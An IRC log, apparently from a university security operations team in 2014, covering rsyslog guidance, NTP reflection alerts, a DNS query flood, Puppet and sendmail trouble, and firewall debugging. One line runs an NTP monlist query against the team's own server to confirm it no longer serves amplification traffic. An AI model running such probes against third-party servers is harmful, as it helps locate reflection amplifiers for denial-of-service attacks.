2014-08-12 17:38:17	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Quit: leaving)
2014-08-12 17:38:26	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-08-12 17:39:42	jschipp	errr
2014-08-12 18:16:37	jazoff	soehlert: doh :) it's double unblocked :)
2014-08-13 08:45:23	jazoff	ah, I got an email from Patrick about that log management thing too
2014-08-13 08:45:31	jazoff	do we have any idea what he is talking about?
2014-08-13 10:26:22	jschipp	no, I'm replying and saying we don't know
2014-08-13 10:26:29	jschipp	I asked Warren he didn't know either
2014-08-13 10:26:41	soehlert	thats strange
2014-08-13 10:27:31	jazoff	yeah, I don't know what to tell him
2014-08-13 10:27:47	jazoff	i'm sure we could come up with something but he seems to be under the impression that we already have it
2014-08-13 10:32:53	jschipp	yeah, I CC'd Randy on it. Will find out :)
2014-08-13 10:33:34	soehlert	apparently randy keeps telling jeannette that we have it so after jon didnt know she was told to tell patrick to as jazoff 
2014-08-13 10:33:52	soehlert	i made it clear to her none of us have any idea and randy can say what he wants, but end of the day we dont have it
2014-08-13 10:34:15	jazoff	yeah, not even sure what the 'it' is
2014-08-13 10:34:25	soehlert	im still not either hah
2014-08-13 10:35:50	jschipp	if you mean my use of 'it', then I mean the issue of not knowing. Referring to the problem as it
2014-08-13 10:36:22	soehlert	i think the 'it' is the document whatever it is
2014-08-13 10:37:09	jschipp	Randy replied and said eyrich mentioned it lol
2014-08-13 10:37:20	jschipp	only 3 words
2014-08-13 10:40:40	eyrich	ah - my fault, I said that we were going to work on a rsyslog document for administrators - such was enablign quiing when sending logs to a TCP collector
2014-08-13 10:40:45	eyrich	I did not say it existed
2014-08-13 10:40:51	soehlert	we are?
2014-08-13 10:41:03	soehlert	i mean i guess that works but i had not heard
2014-08-13 10:41:29	eyrich	i thought jazoff mentioned something about it
2014-08-13 10:42:07	jazoff	yeah.. plain tcp syslog will block and can potentially cause a large amount of people to be mad at us
2014-08-13 10:42:53	jschipp	lol
2014-08-13 10:43:21	jazoff	since a sequence  of events like...
2014-08-13 10:44:04	jazoff	1) we tell everyone to send us syslog. 2) everyone sends us syslog. 3) syslog servers/network/whatever has an issue 4) everyones servers block and ssh and other daemons can't accept connections 5) no one wants to listen to security anymore
2014-08-13 10:46:20	jschipp	there's definitely a trade off with that and ensuring that the logs arrive but I believe there's mitigation for blocking by setting timeout and retry settings in rsyslog
2014-08-13 10:46:53	jazoff	right.. or enabling the disk queue thing
2014-08-13 10:47:36	jschipp	by logs arriving I mean all or what would what be considered acceptable loss (something less than 5% maybe like in the case of UDP)
2014-08-13 10:48:07	jazoff	yeah, losing logs is bad, but breaking peoples servers is worse :)
2014-08-13 10:48:22	jazoff	it's basically the consistency over availability issue
2014-08-13 10:48:33	jschipp	indeed
2014-08-13 10:53:32	soehlert	anyone else a little concerned over the root logins from this morning? probably a script or something, but a crap ton of remote root logins from a comcast ip
2014-08-13 10:55:01	jschipp	jazoff: did you want to handle the logging document :) I'm swamped with the BroLive project atm
2014-08-13 10:57:42	jazoff	i don't know too much about the specifics of what rsyslog can do
2014-08-13 10:57:55	jazoff	just kinda the higher level concept that blocking = bad and queueing = good
2014-08-13 10:58:13	jazoff	unless that's all they are looking for
2014-08-13 10:59:30	jschipp	lol, kk
2014-08-13 11:00:03	jazoff	off the top of my head...
2014-08-13 11:00:10	jazoff	* Log everything, disk space is cheap
2014-08-13 11:00:25	jazoff	* use reliable syslog, but enable queueing so daemons don't block
2014-08-13 11:02:38	jschipp	* Set reasonable time out values, don't be to aggressive
2014-08-13 11:02:48	jschipp	retries* I meant
2014-08-13 11:02:52	jazoff	hmmmm * Use the input feature to ship logs from apps that don't support syslog
2014-08-13 11:02:55	jschipp	* Use RELP 
2014-08-13 11:03:03	jschipp	then TCP then UDP in that order
2014-08-13 11:03:52	jschipp	* Limit access to the rsyslog server from your IP space
2014-08-13 11:04:22	jschipp	* Be aware of your your message sizes and adjust queues appropriately for them
2014-08-13 11:04:48	soehlert	jazoff: do those udpdos alerts from this morning and last night suggest that boris failed in mitigating the issues on rhino?
2014-08-13 11:05:12	jschipp	* Handling of duplicate messages/flooding 
2014-08-13 11:05:13	jazoff	technically no... I realize now that I have the code backwards i think
2014-08-13 11:05:24	soehlert	oh ok 
2014-08-13 11:05:30	jazoff	the alerts mean that people are still trying the attack, not that it is responding
2014-08-13 11:05:35	soehlert	i wont hit send on this email yelling at him then :)
2014-08-13 11:05:47	jazoff	jazoff@air  ~  $ ntpdc -n -c monlist 141.142.234.46
2014-08-13 11:05:48	jazoff	ntpdc: read: Connection refused
2014-08-13 11:05:53	soehlert	k
2014-08-13 11:06:43	jschipp	http://sickbits.net/log-storage-and-analysis-infrastructure-reliable-logging-and-analysis-with-rsyslog-and-relp/
2014-08-13 11:06:45	jschipp	^ :)
2014-08-13 11:09:03	jazoff	ah, nice
2014-08-13 11:09:11	jazoff	I think the bullets we just came up with + that post should be enough
2014-08-13 11:10:45	jazoff	soehlert: did you do https://portal-sec.internal.ncsa.edu/static/ninfo/index.html#/single/69.181.137.148 ?
2014-08-13 11:11:08	soehlert	do it?
2014-08-13 11:11:08	soehlert	is it blocked?
2014-08-13 11:11:12	jazoff	go to 
2014-08-13 11:11:14	jazoff	no
2014-08-13 11:11:29	jazoff	the login history for that ip also finds a lot of kooper logins 
2014-08-13 11:12:02	soehlert	oh i see what you're saying. ya i figured as much. just the number of logins and times seemed odd. i figured it was ok just wanted verification
2014-08-13 11:12:12	soehlert	didnt think to ninfo it though. duh
2014-08-13 11:12:13	ncsabot	Error running plugin
2014-08-13 11:12:22	jazoff	doh
2014-08-13 11:12:22	soehlert	haha oops
2014-08-13 11:12:27	soehlert	ncsa +1
2014-08-13 11:12:28	jazoff	this part is odd though
2014-08-13 11:12:30	soehlert	damnit
2014-08-13 11:12:33	soehlert	ncsabot +1
2014-08-13 11:12:35	jazoff	ninfo geoip 69.181.137.148
2014-08-13 11:12:36	ncsabot	US - United States Mountain View
2014-08-13 11:12:41	jazoff	why mountain view?
2014-08-13 11:12:46	soehlert	ya he said he's in california
2014-08-13 11:12:54	jazoff	hmmmmmm
2014-08-13 11:13:01	jazoff	it's potentially troubling that they can do remote root logins
2014-08-13 11:13:12	jazoff	or rather, IS troubling
2014-08-13 11:13:15	soehlert	read his reply to me
2014-08-13 11:13:35	jazoff	yeahhhhhh
2014-08-13 11:13:40	soehlert	im kinda with you, but i dont think we have authority to say it's not allowed
2014-08-13 11:13:55	soehlert	these are just research VMs that aren't in a high priority zone
2014-08-13 11:14:34	jazoff	jschipp: are you replying to randy or should I?
2014-08-13 11:39:21	jazoff	i'll reply..
2014-08-13 11:39:37	soehlert	hes not at his desk dunno where he went
2014-08-13 11:52:06	jazoff	ah, patrick found a document from somewhere and randy looks happy
2014-08-13 11:52:30	jazoff	it's a bit higher level stuff
2014-08-13 11:52:38	jazoff	"Retain logs in a secure, well managed storage" etc
2014-08-13 11:52:54	soehlert	hah so this doesn't relate to what we were thinking at all..
2014-08-13 11:53:11	jazoff	not reallly
2014-08-13 12:06:40	jazoff	soehlert: ah, does the old tornado still exist?
2014-08-13 12:08:07	 *	soehlert worriedly asks why?
2014-08-13 12:08:20	jazoff	i had some scripts in my home directory
2014-08-13 12:08:35	soehlert	ah hell im sorry i didnt realize there was anything of note on there.
2014-08-13 12:08:46	jazoff	nothing terribly important since heartbleed isn't really an issue anymore
2014-08-13 12:09:37	jazoff	looks like i have a versino of the heartbleed script anyway
2014-08-13 12:09:48	soehlert	ah good
2014-08-13 12:09:53	soehlert	what were you using for that?
2014-08-13 12:10:04	jazoff	hmm?
2014-08-13 12:10:15	soehlert	nmap? 
2014-08-13 12:10:27	jazoff	no.. i hacked up the python POC
2014-08-13 12:10:41	soehlert	ah i see
2014-08-13 12:29:26	eyrich	is rhino actually ntp DDOSing again?
2014-08-13 12:29:51	jazoff	no
2014-08-13 12:30:38	jazoff	it's just getting slammed with inbound reflection attempts
2014-08-13 12:30:44	jazoff	i need to fix the bro policy and flip around the logic
2014-08-13 12:31:05	jazoff	outbound sourced from 143 vs inbound to 143
2014-08-13 12:42:45	jazoff	hmm, apparently this is tricky
2014-08-13 12:50:19	jazoff	ah, just need to look at resp_bytes and not orig_bytes
2014-08-13 13:29:28	jazoff	ok, kinda got it
2014-08-13 13:29:29	jazoff	before:
2014-08-13 13:29:51	jazoff	UDP DoS between 184.175.115.236:5816/udp and 141.142.212.208:123/udp - 1360312 bytes
2014-08-13 13:30:53	jazoff	hmm, or not, doh
2014-08-13 13:31:02	jazoff	just need to get it to know that it should be flipped around
2014-08-13 13:45:38	jazoff	ah, part of the problem is that there are multiple cases we might care about:
2014-08-13 13:46:06	jazoff	inbound dos, outbound dos, inbound reflection trigger packets, outbound reflection trigger packets
2014-08-13 13:46:40	jazoff	right now it is detecting the "inbound reflection trigger packets" which we can't really do anything about
2014-08-13 13:58:08	eyrich	i tihnk in the long run it for an NCSA doc it might be nice to describe how to configure rsyslog to use queues
2014-08-13 13:58:33	eyrich	and perhaps an alert system when the queues are filling
2014-08-13 13:58:44	eyrich	oh crap wrong conversation - damn scroll back
2014-08-13 14:07:11	jazoff	meeting?
2014-08-13 14:07:31	soehlert	nah. no wardog and i think we're all pretty much caught up with each oether
2014-08-13 14:17:04	jazoff	ok, pushed a change to development that should fix the ntp false positives
2014-08-13 14:17:13	jazoff	it should only alert now if resp_size is big
2014-08-13 15:37:07	jazoff	so annoying.. the ntp dos stuff stopped as soon as I fixed the script
2014-08-13 15:38:33	jazoff	so, I think i fixed it, but I had hoped to compare prod alerts to dev alerts
2014-08-15 08:46:47	wardog	Who's up for monthly lunches with CITES Security (and Vlad) every patch tuesday?
2014-08-15 09:17:26	wardog	Make that the first Thursday of the month?
2014-08-15 09:46:41	soehlert	works for me
2014-08-15 10:07:20	jschipp	lol sure
2014-08-15 10:07:43	jschipp	as long as indian is in there every few times
2014-08-15 10:07:52	jschipp	;)
2014-08-15 10:14:00	wardog	cool
2014-08-15 12:53:45	<--	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has quit (Ping timeout)
2014-08-15 12:53:54	jazoff	hmm, that is odd
2014-08-15 12:54:04	soehlert	?
2014-08-15 12:54:12	jazoff	the bot timedo ut
2014-08-15 12:55:03	 *	jazoff kicks it
2014-08-15 13:07:42	jazoff	well that's annoying
2014-08-15 13:10:36	soehlert	what happened?
2014-08-15 14:02:04	jschipp	heading home, going to work from there for the rest of the day
2014-08-15 14:20:13	jazoff	not sure
2014-08-15 16:20:38	wardog	soehlert: https://wiki.ncsa.illinois.edu/display/CSD/Security+Operations+Knowledge+Base?src=contextnavchildmode
2014-08-17 17:42:33	jazoff	soehlert: ah, i think puppet broke stuff on the portal which is why ncsabot broke
2014-08-17 17:42:52	jazoff	it lost it's environment and role/profile which removed all the iptables rules
2014-08-17 17:43:36	-->	ncsabot (nodebot@hidden-1B126FE6.internal.ncsa.edu) has joined #security
2014-08-17 17:43:42	jazoff	yeah, that was it
2014-08-17 17:44:57	jazoff	not really sure why that fixed it though, the firewall rules should have only been for inbound connections
2014-08-18 07:46:17	<--	eyrich (eyrich@D077DE37.62651FD3.B1B5B983.IP) has quit (Connection reset by peer)
2014-08-18 07:54:58	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-08-19 07:59:11	eyrich	ncsabot seen 101.99.69.156
2014-08-19 08:16:06	eyrich	traffic to 101.99.69.156
2014-08-19 08:16:13	ncsabot	Seen in 0 hours over 0 days. First seen in . Last seen in 
2014-08-19 09:23:06	soehlert	jazoff: did you fix the udpdos stuff? can we presume it's legitimate?
2014-08-19 09:23:43	eyrich	it is real - they are PtP link ips on the new network equipment
2014-08-19 09:23:54	eyrich	neteng is working on fixing there ACLs
2014-08-19 09:25:16	soehlert	ya i see you beat me to it anyways
2014-08-19 10:16:42	eyrich	jazoff: can you see if those IPs are still getting ssh and ntp probes
2014-08-19 11:02:31	jazoff	they are, but they do not appear to be responding anymore
2014-08-19 11:05:28	soehlert	that udpdos stuff keeps coming from different hosts on that same subnet...should we bhr that net?
2014-08-19 11:09:45	jazoff	which subnet are you talking about?
2014-08-19 11:10:15	soehlert	208.98.42.
2014-08-19 11:10:17	jazoff	i think neteng has it fixed now, just some residual connections timing out and causing notices to trigger
2014-08-19 11:36:00	soehlert	ok cool works for me
2014-08-19 13:02:42	jazoff	something odd is going on with 141.142.220.95
2014-08-19 13:03:48	jazoff	[jazoff@supercell current]$ head -n 100000 dns.log |bro-cut  id.orig_h | sort|uniq  -c|sort -rn|head -n 4
2014-08-19 13:03:50	jazoff	  92738 141.142.220.95
2014-08-19 13:03:53	jazoff	   1715 141.142.160.4
2014-08-19 13:04:42	jazoff	[jazoff@supercell current]$ cat dns.log |bro-grep 141.142.220.95 | bro-cut query | head -n 100000|sort|uniq -c
2014-08-19 13:04:45	jazoff	   1632 -
2014-08-19 13:04:47	jazoff	  18739 b._dns-sd._udp.0.220.142.141.in-addr.arpa
2014-08-19 13:04:49	jazoff	  21112 db._dns-sd._udp.0.220.142.141.in-addr.arpa
2014-08-19 13:04:51	jazoff	  21093 dr._dns-sd._udp.0.220.142.141.in-addr.arpa
2014-08-19 13:04:54	jazoff	  18680 lb._dns-sd._udp.0.220.142.141.in-addr.arpa
2014-08-19 13:07:49	jazoff	[jazoff@supercell current]$ fgrep -c 141.142.220.95 dns.log ;date
2014-08-19 13:07:50	jazoff	6270986
2014-08-19 13:07:57	jazoff	in 7:43 minutes
2014-08-19 13:08:16	jazoff	which works out to 13544 dns queries/second
2014-08-19 13:29:53	wardog	fixed
2014-08-19 13:34:51	jazoff	yep
2014-08-19 14:21:50	soehlert	resized /usr/local on supercell for now. are we getting a lot more logs as of late or something? ~6GB/day is normal no?
2014-08-19 14:24:48	jazoff	soehlert: heh, dns issue I pasted stuff from
2014-08-19 14:27:50	soehlert	ahhh gotcha. figure out why it was doing that?
2014-08-19 14:29:50	wardog	something with apple's installer got borked.
2014-08-19 14:29:55	wardog	Apparently it's not unique
2014-08-19 14:33:07	soehlert	and it causes a crap ton of dns queries
2014-08-19 14:35:47	jazoff	https://lists.isc.org/pipermail/bind-users/2012-August/088524.html
2014-08-19 14:37:12	jazoff	soehlert: can you bump up usr/local on bro-dev too
2014-08-19 14:39:47	soehlert	sure, how much?
2014-08-19 14:40:46	jazoff	20G should do
2014-08-19 14:40:54	soehlert	k
2014-08-19 14:41:04	jazoff	or howeer much you grew supercell by
2014-08-19 14:41:24	soehlert	25G
2014-08-19 14:41:32	soehlert	we got 353 to play with so ill do that :)
2014-08-19 14:43:03	soehlert	done
2014-08-19 14:43:58	jazoff	great
2014-08-20 09:28:46	soehlert	jschipp: any idea what that was all about?
2014-08-20 09:32:54	soehlert	according to eyrich, it seems to be a CPU spike that possibly put nagios behind on its checks
2014-08-20 09:36:46	jazoff	is that when veem runs by any chance?
2014-08-20 09:37:07	soehlert	nah VEEAM runs at like 2 or 3 am something like that
2014-08-20 09:37:28	jazoff	ah
2014-08-20 09:53:28	jschipp	not sure yet, my commit on sshd_config is the last thing in the repo and from yesterday afternoon
2014-08-20 10:09:50	jschipp	09:00:01 AM     all      0.29      1.74      1.57      0.14      0.00     96.26
2014-08-20 10:09:53	jschipp	09:10:01 AM     all      0.18     10.43     48.64      0.09      0.00     40.67
2014-08-20 10:09:56	jschipp	09:20:02 AM     all      0.80      4.56     18.00      0.13      0.00     76.50
2014-08-20 10:10:37	jschipp	system load (kernel processes) went up to 48% at 9:10 A.M. 
2014-08-20 15:26:34	jazoff	ah, taht is in munin
2014-08-20 15:28:46	jschipp	what's in munin?
2014-08-20 15:28:52	jazoff	nagios-sec
2014-08-20 15:28:57	jazoff	was that the host with the problem?
2014-08-20 15:29:25	jazoff	possibly unrelated, why does munin say nagios-sec has 290 emails queued in sendmail?
2014-08-20 15:29:39	jschipp	yeah, one of them, each of hte nagios servers had a problem.
2014-08-20 15:30:44	jschipp	oh, missed that lol
2014-08-20 15:32:04	jschipp	[root@nagios-sec ~]# mailq
2014-08-20 15:32:05	jschipp	/var/spool/mqueue is empty
2014-08-20 15:32:05	jschipp	                Total requests: 0
2014-08-20 15:32:42	jschipp	nothing there nor in /var/spool/mail/*
2014-08-20 15:34:18	jazoff	hmmm
2014-08-20 15:34:19	jazoff	oh
2014-08-20 15:34:23	jazoff	does that have postfix and sendmail?
2014-08-20 15:34:33	jazoff	look in /var/spool/clientmqueue i think it is
2014-08-20 15:36:02	jschipp	I just received messages from May
2014-08-20 15:36:06	jschipp	SMS lol
2014-08-20 15:36:25	jschipp	after turning on sendmail
2014-08-20 15:36:49	jazoff	ah
2014-08-20 15:37:01	wardog	hmm... Could that also explain the 4am message from the other day?
2014-08-20 15:38:39	-->	jschipp_ (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-08-20 15:38:44	--	jschipp_ is now known as keist
2014-08-20 15:38:57	keist	err, irssi stops responding at least once a week
2014-08-20 15:39:30	keist	wardog: no, I don't think that's related because sendmail is just now running
2014-08-20 15:40:02	keist	nagios doesn't need it to send messages
2014-08-20 15:40:04	<--	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Ping timeout)
2014-08-20 15:40:37	keist	but I looked and those logs for the 4 A.M. notification were not sent to syslog
2014-08-20 15:41:05	keist	there was a cert issue with puppet that caused it to be very behind on the latest configurations
2014-08-20 15:41:45	keist	it's resolved now and logging to syslog and the errors fixed, i'm surprised nagios was able to run
2014-08-20 15:43:50	keist	puppet is stopping sendmail is seems: Notice: /Stage[main]/Smtp::Msp/Service[sendmail]/ensure: ensure changed 'running' to 'stopped'
2014-08-20 15:45:32	-->	jschipp (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has joined #security
2014-08-20 15:49:08	keist	jazoff: what's the best way to not run the Smtp::Msp class on the nagios servers
2014-08-20 15:49:33	keist	it's in hieradata/*/common.yaml
2014-08-20 15:52:34	jazoff	hmmmmm
2014-08-21 01:10:52	soehlert	gonna work from home tomorrow. gotta have a dreaded call with comcast and sign for a package.
2014-08-21 08:35:08	eyrich	jazoff: are you done with https API troubleshooting with Arista?
2014-08-21 08:59:19	wardog	don't forget to record your call.
2014-08-21 09:50:28	soehlert	and let them know you're recording it, weird wire tapping laws here.
2014-08-21 09:51:50	wardog	2 party consent, in illinois. However, no one has yet enforced it and there's a grey area where their automated recording gives you a little leeway, 'This call may be recorded for quality assurance purposes'.
2014-08-21 09:52:21	wardog	You essentially give up your right to not be recorded, and thus so do they, or so goes the argument.
2014-08-21 09:52:46	jazoff	yeah, would be backwards teh other day
2014-08-21 09:52:49	jazoff	other way..
2014-08-21 09:53:00	jazoff	they say the call may be recorded, so they are allowed to record but you are not
2014-08-21 10:11:30	soehlert	jazoff: can you take a peek at the sysadmin-todo file in secops repo. add anything you need to that missing, and if there's any stuff on there you want to own, do that too. 
2014-08-21 10:14:39	jazoff	added splunk
2014-08-21 10:14:55	soehlert	cool
2014-08-21 13:41:01	wardog	Was just thinking about that. Campus should be getting the Splunk license soon then we can move up to 6 on a new machine.
2014-08-21 13:49:07	soehlert	and im about ready to spend my life at NPCF switching those all over, so that would be good timing
2014-08-21 13:50:58	soehlert	in other news..really glad i paid extra to get my package here before noon today
2014-08-21 13:51:05	 *	soehlert waits longer and longer..
2014-08-22 08:42:33	soehlert	package never showed up yesterday but after talking to them, it sounds like it'll be here today. i'll be in after i sign for it
2014-08-22 08:42:59	jazoff	lame
2014-08-22 08:49:46	soehlert	indeed. especially since i paid extra to have it show up yesterday...but at least they refunded me..
2014-08-22 08:50:22	soehlert	the shipping that is, would be awesome if thye just gave me all the money back
2014-08-22 09:04:08	soehlert	keist: I realize I'm a few days behind here, but that puppet sendmail thing doesn't actually stop sendmail, just keeps it from acting like a relay.
2014-08-22 10:45:13	jschipp	soehlert: you sure about that?
2014-08-22 10:45:15	jschipp	[root@nagios-sec ~]# service sendmail start
2014-08-22 10:45:15	jschipp	Starting sendmail:                                         [  OK  ]
2014-08-22 10:45:15	jschipp	Starting sm-client:                                        [  OK  ]
2014-08-22 10:45:15	jschipp	[root@nagios-sec ~]# puppet agent -t
2014-08-22 10:45:30	jschipp	...
2014-08-22 10:45:31	jschipp	Notice: /Stage[main]/Smtp::Msp/Service[sendmail]/ensure: ensure changed 'running' to 'stopped'
2014-08-22 10:45:34	jschipp	Notice: Finished catalog run in 14.76 seconds
2014-08-22 10:45:36	jschipp	[root@nagios-sec ~]# service sendmail status
2014-08-22 10:45:39	jschipp	sendmail is stopped  
2014-08-22 10:45:41	jschipp	sm-client is stopped 
2014-08-22 10:57:32	jschipp	I'm going to make like rsyslog's init.pp so that I can pass an option in hiera for the nagios servers so they aren't stopped
2014-08-22 11:29:43	jschipp	jazoff: you can get into ansible-sec now
2014-08-22 11:32:36	jschipp	I re-did the smtp module and pushed it to the deveopment branch, let me know if you have any issues. Working for me so far
2014-08-22 11:33:19	<--	keist (jschipp@hidden-E95C13A8.ncsa.illinois.edu) has quit (Quit: leaving)
2014-08-22 12:40:02	jschipp	If you like metal please listen and share my joy: https://www.youtube.com/watch?v=99IIKQUtA8s
2014-08-22 13:49:02	wardog	Can someone try https://ops-security.xsede.org/
2014-08-22 13:50:38	soehlert	thats weird. it just...doesn't load. no 404 or anything just..nothing
2014-08-22 13:50:49	wardog	I *think* firewall rules look ok
2014-08-22 13:50:59	wardog	and httpd is running.
2014-08-22 13:51:02	soehlert	they should be...just need 443 for that right?
2014-08-22 13:51:25	wardog	yep
2014-08-22 13:51:45	wardog	-A INPUT -p tcp -m multiport --dports 443 -m comment --comment "210 allow web traffic from the world" -j ACCEPT
2014-08-22 13:52:07	soehlert	that's the one for mediawiki right?
2014-08-22 13:52:07	soehlert	ah ok ya i just checked the module and it looks like it should work and you just proved that
2014-08-22 13:52:35	wardog	yeah
2014-08-22 13:52:51	wardog	huh...
2014-08-22 13:52:52	wardog	tcp        0      0 :::7443                     :::*                        LISTEN      24926/java
2014-08-22 13:52:55	wardog	tcp        0      0 :::443                      :::*                        LISTEN      7428/httpd
2014-08-22 13:53:00	wardog	no ipv4, only ipv6
2014-08-22 13:53:34	wardog	that's... new...
2014-08-22 13:55:19	jazoff	i think that counts for both
2014-08-22 13:55:34	soehlert	ya ive seen that before.
2014-08-22 13:56:24	wardog	well then...
2014-08-22 13:57:18	wardog	yep. listens on both. 127.0.0.1 and ::1 are both responding.
2014-08-22 14:07:50	wardog	Ok, I can get to it tunneling through fog, but not otherwise.
2014-08-22 14:07:53	wardog	Not a single packet.
2014-08-22 14:08:15	soehlert	weird and im tunneling through fog and cant get it to load
2014-08-22 14:09:21	jschipp	should nrpe be running on rsaam{1,2}? 
2014-08-22 14:09:34	soehlert	no they are some weird appliance image from RSA
2014-08-22 14:09:43	jschipp	kk
2014-08-22 14:09:48	jazoff	i can get to it from fog
2014-08-22 14:10:04	soehlert	im timing out now from fog. this is weird
2014-08-22 14:10:05	jazoff	curl https://ops-security.xsede.org works
2014-08-22 14:10:09	wardog	oh...
2014-08-22 14:10:28	wardog	It's not dropping rfc1918 traffic is it?
2014-08-22 14:10:40	wardog	I'm on wireless on a 172.16 adddress..
2014-08-22 14:10:41	wardog	nah.
2014-08-22 14:10:50	soehlert	curl doesn't work for me.
2014-08-22 14:10:58	soehlert	i'm on wireless too
2014-08-22 14:11:03	wardog	is that the printer that's squealing?
2014-08-22 14:11:05	soehlert	but also tunneled through fog they both fail
2014-08-22 14:11:10	soehlert	yes it is
2014-08-22 14:11:10	wardog	weird.
2014-08-22 14:11:54	soehlert	yup just timing out everywhere
2014-08-22 14:14:01	soehlert	traceroute from my laptop is taking excruciatingly long.
2014-08-22 14:14:15	soehlert	from fog it works great though which is weird that i cant get to it frm fog
2014-08-22 14:14:43	soehlert	can telnet from fog to 443 ops-security easily too
2014-08-22 14:18:00	jazoff	soehlert: your proxy config doesnt forward it through fog
2014-08-22 14:18:05	jazoff	since it's not .ncsa
2014-08-22 14:18:11	soehlert	ahhh good call
2014-08-22 14:18:32	soehlert	yup curl command from fog works so thats it.
2014-08-22 14:23:05	wardog	try wiki-sec.ncsa.illinois.edu. Same address.
2014-08-22 14:23:08	wardog	but .ncsa
2014-08-22 14:23:25	soehlert	ya that works fine
2014-08-22 14:23:42	soehlert	through fog that is
2014-08-22 14:24:43	wardog	right. Fog is on the same lan.
2014-08-22 14:25:16	wardog	need to try from 141.142 but not on the 148 block
2014-08-22 14:25:31	wardog	Looks like it's just not getting routed.
2014-08-22 14:25:49	wardog	outbound works though...
2014-08-22 14:26:07	jazoff	what does
2014-08-22 14:26:08	jazoff	ip route get 8.8.8.8
2014-08-22 14:26:08	jazoff	output
2014-08-22 14:26:20	wardog	8.8.8.8 via 141.142.148.1 dev eth0  src 141.142.148.18 cache  mtu 1500 advmss 1460 hoplimit 64
2014-08-22 14:26:24	soehlert	8.8.8.8 via 141.142.148.1 dev eth0  src 141.142.148.18
2014-08-22 14:26:24	soehlert	    cache  mtu 1500 advmss 1460 hoplimit 64
2014-08-22 14:26:44	jazoff	that seems right
2014-08-22 14:27:12	wardog	ok. I think I see why
2014-08-22 14:27:17	wardog	Check BHR
2014-08-22 14:28:10	soehlert	?
2014-08-22 14:28:45	wardog	I think it may have been manually blocked by me
2014-08-22 14:29:03	soehlert	it said it wasn't blocked, but that would make sense
2014-08-22 14:29:06	wardog	what's the ncsabot line?
2014-08-22 14:29:48	jazoff	ninfo bhlist 141.142.148.18
2014-08-22 14:30:05	jazoff	well, the output would be empty
2014-08-22 14:30:40	ncsabot	Empty Result
2014-08-22 14:30:42	wardog	Wait.
2014-08-22 14:30:47	wardog	IT can get out.
2014-08-22 14:30:50	wardog	So... that's not right.
2014-08-22 14:30:59	jazoff	sounds like iptables is just not quite right
2014-08-22 14:31:22	wardog	Maybe kick it and see if that fixes it.
2014-08-22 14:31:44	soehlert	well hell turn off iptables and test it right quick to see if it's iptables 
2014-08-22 14:33:49	wardog	nope
2014-08-22 14:33:58	wardog	wait. wrong service
2014-08-22 14:35:05	wardog	yeah, that didn't do it.
2014-08-22 14:38:24	jazoff	run tcpdump -n -i eth0 and see if it is even seeing the inbound syn to 443 
2014-08-22 14:38:37	jazoff	'tcpdump -n -i eth0 port 443' or such
2014-08-22 14:40:45	wardog	yeah, did that. It's not.
2014-08-22 14:41:06	jazoff	does it have the right netmask?
2014-08-22 14:41:22	soehlert	yup
2014-08-22 14:41:42	wardog	And it can successfully ping off-campus
2014-08-22 14:42:20	wardog	routing looks fine
2014-08-22 14:43:13	soehlert	theres no pfsense anything in the way right? I mean i dont think so but that theoretically could make sense
2014-08-22 14:45:28	wardog	Isn't that what's routing the 148.x net?
2014-08-22 14:45:51	soehlert	ya but i dont think theres really any fw rules. can ask eyrich though
2014-08-22 14:47:41	jazoff	kinda what it looks like
2014-08-22 15:04:22	soehlert	i'll check in a minute
2014-08-22 15:18:37	wardog	how do I access teh router?
2014-08-22 15:18:48	wardog	I think I found it. in vshpere.
2014-08-22 15:18:57	soehlert	nah hang on im working on it
2014-08-22 15:20:09	soehlert	or not...its not loading..
2014-08-22 15:21:11	wardog	might need to enable it from the interface.
2014-08-22 15:21:21	wardog	er, console.
2014-08-22 15:21:25	soehlert	nah the WUI should be always listening
2014-08-22 15:21:32	soehlert	is this something you need to get done today?
2014-08-22 15:21:38	wardog	Nah.
2014-08-22 15:21:45	wardog	It can wait.
2014-08-22 15:21:50	wardog	Just pulling on a thread.
2014-08-22 15:21:59	soehlert	i say lets wait for eyrich next week then. i can poke around and look confidently, but don't want to mess with this thing without him
2014-08-22 15:24:25	wardog	yep, that works.
2014-08-22 15:26:23	soehlert	oh wait, it's working if I use sects01 to get to the WUI
2014-08-22 15:35:26	wardog	I tried that.
2014-08-22 15:35:32	wardog	What's the IP address?
2014-08-22 15:39:37	soehlert	wardog: ok this isnt making sense, can we just reboot wiki-sec?
2014-08-22 15:39:49	wardog	sure.
2014-08-22 15:39:52	wardog	I'm on there.
2014-08-22 15:39:58	soehlert	welp not anymore
2014-08-22 15:39:58	wardog	and there it goes. :)
2014-08-22 15:40:21	wardog	So I take it there weren't any rules blocking traffic?
2014-08-22 15:40:42	soehlert	nope
2014-08-22 15:41:25	wardog	I'm doing a traceroute from wireless.
2014-08-22 15:41:32	wardog	It's getting stopped at the exit.
2014-08-22 15:41:57	wardog	oh, eneverind.
2014-08-22 15:47:52	wardog	still nothin. weird.
2014-08-22 16:44:10	--	irc: disconnected from server
2014-08-22 16:45:41	-->	soehlert (soehlert@hidden-EF13FB3B.hsd1.il.comcast.net) has joined #security
2014-08-22 16:45:41	--	Channel #security: 6 nicks (0 ops, 0 halfops, 0 voices, 6 normals)
2014-08-22 16:45:53	--	Mode #security [+]
2014-08-22 16:45:53	--	Channel created on Tue, 04 Feb 2014 20:39:53
2014-08-22 16:58:08	jazoff	TIL that zone1b is a thing
2014-08-25 07:26:59	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-08-25 07:46:17	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-08-25 09:41:58	<--	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has quit (Quit: Leaving.)
2014-08-25 10:29:15	-->	eyrich (eyrich@hidden-F53FC8AD.ncsa.illinois.edu) has joined #security
2014-08-25 13:28:18	eyrich	http://jadedadmin.blogspot.com/2013/08/starting-vmtoolsd-as-service-on-red-hat.html
2014-08-25 13:31:03	eyrich	http://www.chriscolotti.us/vmware/info-linux-vmware-tools-install-changes-to-upstart/
2014-08-25 14:44:42	soehlert	the second one does not apply as that isn't the same set of tools that comes from the repo (which is why the repo ones show as third party)
